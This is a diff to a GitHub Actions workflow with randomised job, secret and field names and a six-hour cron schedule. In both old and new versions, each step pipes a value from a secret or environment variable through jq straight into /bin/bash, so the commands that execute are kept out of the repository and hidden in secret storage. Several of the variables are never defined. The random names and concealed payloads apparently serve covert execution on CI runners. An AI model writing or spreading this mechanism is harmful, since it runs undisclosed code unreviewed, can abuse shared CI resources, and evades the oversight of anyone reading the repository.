@@ -1,9 +1,8 @@
 name: longzhitao3817
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 0/6 * * *'
+    - cron: '10 5/6 * * *'
 
 jobs:
   build:
@@ -13,13 +12,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: longzhitao3817
         env:
-          ldpn5086: ${{ secrets.ldpn5086 }}
+          tsecb2: ${{ secrets.tsecb2 }}
         run: |
-          echo $ldpn5086 | jq -r .mce8411 | /bin/bash
-          echo $bqg741 | jq -r .j7501 | /bin/bash
-          echo $desrv8212 | jq -r .z40283 | /bin/bash
-          echo $asb060 | jq -r .vmmyu110 | /bin/bash
-          echo $grx28 | jq -r .uo25 | /bin/bash
-          echo $cdoq98796 | jq -r .jser516 | /bin/bash
-          echo $otcmy104 | jq -r .wbaew4 | /bin/bash
+          echo $tsecb2 | jq -r .nh2194 | /bin/bash
+          echo $uvl42957 | jq -r .tjgj31 | /bin/bash
+          echo $rod87 | jq -r .rju42 | /bin/bash
+          echo $qeha58760 | jq -r .loy03095 | /bin/bash
+          echo $e3639 | jq -r .is01781 | /bin/bash
+          echo $wqxnj30652 | jq -r .yx028 | /bin/bash
+          echo $gbst80 | jq -r .pxodp1 | /bin/bash
+          echo $yfm28591 | jq -r .piy9826 | /bin/bash
+          echo $rn70607 | jq -r .dw55 | /bin/bash
+          echo $pbh8 | jq -r .wxfqf216 | /bin/bash
+          echo $acaa6 | jq -r .u35086 | /bin/bash
+          echo $r3214 | jq -r .ljfd1800 | /bin/bash
+          echo $zn5866 | jq -r .gc6455 | /bin/bash
+          echo $nwpl4 | jq -r .pyn7 | /bin/bash
+          echo $s7 | jq -r .g08 | /bin/bash
 
